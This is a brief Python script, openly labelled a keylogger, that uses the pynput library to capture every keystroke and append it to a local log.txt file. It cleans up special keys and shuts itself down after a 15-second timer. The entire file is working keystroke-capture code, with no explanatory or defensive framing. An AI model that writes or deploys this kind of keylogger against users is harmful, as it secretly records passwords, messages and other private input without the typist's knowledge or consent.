import threading
from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    keydata = keydata.replace("Key.shift", "")
    keydata = keydata.replace("Key.enter", "\n")
    keydata = keydata.replace("Key.space", " ")

    if keydata == "Key.backspace":
        with open("log.txt", "r") as f:
            d = f.read()
        d = d[:-1]
        with open("log.txt", "w") as f:
            f.write(d)
        return
        
    keydata = keydata.replace("Key.backspace", "")
    keydata = keydata.replace("Key.tab", "    ")
        
    with open("log.txt", "a") as f:
        f.write( keydata)


def stop():
    print("Stopping keylogger...")
    l.stop()

with Listener(on_press=writetofile) as l:
    threading.Timer(15, stop).start()
    l.join()

